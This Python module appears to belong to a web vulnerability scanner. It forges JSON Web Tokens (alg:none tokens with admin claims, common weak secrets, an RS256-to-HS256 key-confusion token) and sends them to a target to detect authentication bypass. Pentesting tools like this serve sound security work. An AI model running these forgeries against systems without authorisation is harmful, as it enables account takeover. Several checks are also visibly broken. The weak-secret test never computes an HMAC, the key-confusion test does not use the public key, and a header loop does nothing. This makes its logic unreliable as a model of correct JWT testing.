import base64
import json
import time
from urllib.parse import urlparse, urljoin

import httpx

from .base import BaseScanner
from .registry import register_scanner
from core.models import ScannerManifest, ScanTarget, FindingSeverity

COMMON_SECRETS = [
    "secret", "password", "key", "123456", "admin", "test",
    "secretkey", "changeme", "s3cr3t", "mysecret", "jwt_secret",
    "supersecret", "pass", "default", "token", "private",
    "abc123", "letmein", "qwerty", "monkey", "dragon",
]

JWT_ATTACKS = [
    {"name": "alg_none", "header": {"alg": "none"}, "payload": {"sub": "admin", "admin": True}},
    {"name": "alg_none_upper", "header": {"alg": "NONE"}, "payload": {"sub": "admin", "admin": True}},
    {"name": "alg_none_mixed", "header": {"alg": "NoNe"}, "payload": {"sub": "admin", "admin": True}},
]


def _b64_encode(data: dict) -> str:
    raw = json.dumps(data, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def _make_jwt(header: dict, payload: dict, signature: str = "") -> str:
    return f"{_b64_encode(header)}.{_b64_encode(payload)}.{signature}"


def _b64_decode(data: str) -> dict:
    padded = data + "=" * (4 - len(data) % 4)
    try:
        return json.loads(base64.urlsafe_b64decode(padded))
    except Exception:
        return {}


@register_scanner(manifest=ScannerManifest(
    name="jwt_scanner",
    category="exploit",
    risk_level="aggressive",
    estimated_cost=30,
    prerequisites=[],
    produces_tag_patterns=["jwt", "auth-bypass", "signature-bypass"],
    produces_endpoint_types=["auth_provider"],
))
class JwtScanner(BaseScanner):
    name = "jwt_scanner"

    async def scan(self, target: ScanTarget) -> tuple[list, list]:
        findings = []
        endpoints = []
        client = await self.get_client()

        discovered_jwts = await self._find_jwts(client, target.url)

        for token_info in discovered_jwts:
            token = token_info["token"]
            location = token_info["location"]
            ep = self.make_endpoint(url=location, discovered_by=self.name)
            endpoints.append(ep)

            decoded = self._decode_token(token)
            if decoded:
                findings.append(self.make_finding(
                    title="JWT Token Discovered",
                    description=f"JWT token found at {location}",
                    severity=FindingSeverity.INFO.value,
                    endpoint=ep,
                    evidence={"token": token, "header": decoded.get("header"), "payload": decoded.get("payload"), "location": location},
                    confidence=1.0,
                    tags=["jwt", "info"],
                ))

                for attack in JWT_ATTACKS:
                    crafted = _make_jwt(attack["header"], {**decoded["payload"], **attack["payload"]})
                    result = await self._test_jwt(client, location, crafted, attack["name"])
                    if result:
                        findings.append(self.make_finding(
                            title=f"JWT Signature Bypass — {attack['name']}",
                            description=f"Accepted JWT with `alg: {attack['header']['alg']}` at {location}. The server did not verify the signature algorithm.",
                            severity=FindingSeverity.CRITICAL.value,
                            endpoint=ep,
                            evidence={"crafted_token": crafted, "attack": attack["name"], "response_status": result["status"], "response_body": result["body"][:300]},
                            confidence=0.9,
                            tags=["jwt", "auth-bypass", "signature-bypass"],
                        ))

                for secret in COMMON_SECRETS:
                    crafted = _make_jwt(decoded["header"], decoded["payload"], secret)
                    result = await self._test_jwt(client, location, crafted, f"weak_secret:{secret}")
                    if result:
                        findings.append(self.make_finding(
                            title=f"JWT Weak Secret Cracked — '{secret}'",
                            description=f"JWT secret `{secret}` accepted at {location}. Token can be forged with any payload.",
                            severity=FindingSeverity.CRITICAL.value,
                            endpoint=ep,
                            evidence={"cracked_secret": secret, "crafted_token": crafted, "response_status": result["status"]},
                            confidence=0.95,
                            tags=["jwt", "weak-secret", "auth-bypass"],
                        ))
                        break

                if decoded["header"].get("alg", "").upper() in ("RS256", "RS384", "RS512"):
                    crafted = _make_jwt({"alg": "HS256", "typ": "JWT", "kid": decoded["header"].get("kid", "")}, decoded["payload"], _b64_encode({"kty": "oct", "k": "AAAAAAAAAAAAAAAAAAAAAA"}))
                    result = await self._test_jwt(client, location, crafted, "rs_to_hs_confusion")
                    if result:
                        findings.append(self.make_finding(
                            title="JWT RS256→HS256 Key Confusion",
                            description=f"Server accepted HS256-signed token at {location}. The public key can be used as an HMAC secret.",
                            severity=FindingSeverity.CRITICAL.value,
                            endpoint=ep,
                            evidence={"crafted_token": crafted, "response_status": result["status"]},
                            confidence=0.85,
                            tags=["jwt", "key-confusion", "auth-bypass"],
                        ))

        return findings, endpoints

    async def _find_jwts(self, client: httpx.AsyncClient, url: str) -> list[dict]:
        results = []
        try:
            resp = await client.request("GET", url)
            self._stats["requests"] += 1
            body = resp.text or ""
            for hdr in ("authorization", "x-auth-token", "x-jwt", "token"):
                if hdr in {k.lower(): v for k, v in resp.headers.items()}:
                    pass

            import re
            jwt_pattern = re.compile(r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+')
            for match in jwt_pattern.finditer(body):
                token = match.group()
                if self._valid_jwt_structure(token):
                    results.append({"token": token, "location": url})

            if "authorization" in {k.lower(): k for k in resp.headers}:
                auth_val = resp.headers.get({k.lower(): k for k in resp.headers}.get("authorization", ""), "")
                if auth_val.startswith("Bearer "):
                    token = auth_val[7:]
                    if self._valid_jwt_structure(token):
                        results.append({"token": token, "location": url})
        except Exception:
            self._stats["errors"] += 1
        return results

    @staticmethod
    def _valid_jwt_structure(token: str) -> bool:
        parts = token.split(".")
        if len(parts) != 3:
            return False
        try:
            hdr = _b64_decode(parts[0])
            return "alg" in hdr
        except Exception:
            return False

    @staticmethod
    def _decode_token(token: str) -> dict | None:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        try:
            return {"header": _b64_decode(parts[0]), "payload": _b64_decode(parts[1])}
        except Exception:
            return None

    async def _test_jwt(self, client: httpx.AsyncClient, url: str, token: str, label: str) -> dict | None:
        try:
            two_responses = []
            for auth_header in (None, token):
                hdrs = {"Authorization": f"Bearer {auth_header}"} if auth_header else {}
                resp = await client.request("GET", url, headers=hdrs, follow_redirects=False)
                self._stats["requests"] += 1
                two_responses.append(resp)
            baseline, attacked = two_responses

            if attacked.status_code != baseline.status_code and attacked.status_code in (200, 302, 301):
                return {"status": attacked.status_code, "body": attacked.text or ""}
            return None
        except Exception:
            return None
